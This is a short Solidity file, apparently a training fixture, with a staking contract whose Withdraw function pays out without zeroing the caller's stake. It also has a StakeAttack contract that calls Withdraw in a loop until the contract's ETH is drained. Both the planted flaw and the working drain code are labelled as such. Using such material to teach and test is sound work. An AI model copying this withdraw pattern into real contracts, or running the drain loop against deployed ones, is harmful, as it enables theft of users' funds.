// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

contract Stake {
    mapping(address => uint256) public stakes;
    address public owner;
    uint256 public totalStaked;

    constructor() payable {
        owner = msg.sender;
    }

    function stake() external payable {
        require(msg.value >= 0.001 ether, "too small");
        stakes[msg.sender] += msg.value;
        totalStaked += msg.value;
    }

    function Withdraw() external {
        uint256 amount = stakes[msg.sender];
        require(amount > 0, "nothing staked");
        // BUG: stakes is NOT zeroed before the transfer.
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "withdraw failed");
    }

    receive() external payable {}
}

contract StakeAttack {
    function attack(Stake target) external payable {
        target.stake{value: msg.value}();
        // Withdraw repeatedly: stakes[msg.sender] is never zeroed, so each
        // call sends the full staked amount again until the contract is dry.
        while (address(target).balance >= 0.001 ether) {
            target.Withdraw();
        }
    }

    receive() external payable {}
}

// Local training fixture: Withdraw sends the full staked balance without
// resetting stakes[msg.sender], so it can be called repeatedly to drain the
// contract's ETH.

